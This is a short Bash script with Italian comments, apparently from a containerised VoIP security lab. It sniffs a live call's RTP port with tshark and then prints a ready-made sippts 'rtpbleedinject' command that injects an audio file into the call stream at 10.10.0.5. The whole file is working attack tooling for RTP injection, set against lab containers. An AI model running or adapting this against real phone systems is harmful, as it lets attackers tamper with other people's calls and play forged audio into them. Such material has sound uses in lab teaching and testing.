#!/bin/bash

# Interrompe lo script in caso di errori
set -e

echo "[*] In attesa di intercettare il traffico RTP..."
echo "[*] (Assicurati di aver lanciato 'make baresip-call' in un altro terminale)"

# Sfrutta il container wireshark per sniffare 1 singolo pacchetto UDP nel range 10000-10099
# -c 1 : si ferma dopo 1 pacchetto
# -T fields -e udp.dstport : estrae solo la porta di destinazione
PORT=$(docker exec wireshark tshark -i eth0 -f "udp portrange 10000-10099" -c 1 -T fields -e udp.dstport 2>/dev/null | head -n 1 | tr -d '\r')

if [ -z "$PORT" ]; then
    echo "[!] Nessun traffico RTP rilevato. Sicuro che la chiamata sia in corso?"
    exit 1
fi

echo "[+] Traffico RTP rilevato con successo!"
echo "[+] Porta bersaglio: $PORT"
echo "=========================================================================="
echo "Copia e incolla il seguente comando per lanciare l'attacco RTP Injection:"
echo "=========================================================================="
echo -e "\033[1;32mdocker exec sippts sippts rtpbleedinject -i 10.10.0.5 -r $PORT -f /audio_inject.wav -p 0\033[0m"
echo ""